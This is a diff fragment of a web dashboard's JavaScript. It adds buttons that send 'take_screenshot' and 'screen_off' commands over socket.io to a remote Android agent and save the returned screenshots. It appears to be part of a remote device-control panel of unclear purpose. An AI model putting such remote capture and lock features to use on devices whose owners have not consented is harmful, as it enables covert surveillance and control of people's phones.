+    a.href = img.src;
+    a.download = "android_screenshot_" + Date.now() + ".jpg";
+    a.click();
+  };
+  toast("Screenshot received", "ok");
+});
+$("and-ss-btn").onclick = () => { $("and-ss-status").textContent = "Capturing…"; $("and-ss-status").style.display = ""; andFetch("take_screenshot", {}); };
+
+// ── Lock Screen ───────────────────────────────────────────────
+socket.on("screen_off_result", d => {
+  if (d._agent && d._agent !== agent) return;
+  $("and-lock-status").textContent = d.ok ? "Screen locked successfully." : "Failed to lock screen.";
+  $("and-lock-status").style.color = d.ok ? "var(--green)" : "var(--red)";
+  toast(d.ok ? "Screen locked" : "Lock failed", d.ok ? "ok" : "err");
+});
+$("and-lock-btn").onclick = () => { $("and-lock-status").textContent = "Sending lock command…"; andFetch("screen_off", {}); };
 </script>
 
 </body>
